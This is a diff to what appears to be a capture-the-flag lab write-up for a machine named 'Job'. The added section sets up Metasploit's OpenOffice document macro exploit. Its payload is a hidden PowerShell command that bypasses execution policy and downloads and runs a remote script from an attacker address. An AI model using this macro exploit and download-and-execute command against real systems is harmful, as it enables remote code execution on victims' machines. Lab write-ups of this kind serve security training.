@@ -60,3 +60,17 @@ Host script results:
 
 ### Adding the host to file
 `echo "10.129.234.73 Job.local" | sudo tee -a /etc/hosts`
+
+### Using MSFconsole
+```bash
+msfconsole -q
+search openoffice
+use exploit/multi/misc/openoffice_document_macro
+
+# Configuring the settings
+set payload windows/x64/exec
+set cmd "powershell.exe -nop -w hidden -ep bypass -c IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.86/shell.txt');"
+set SRVHOST 10.10.16.150
+
+
+```
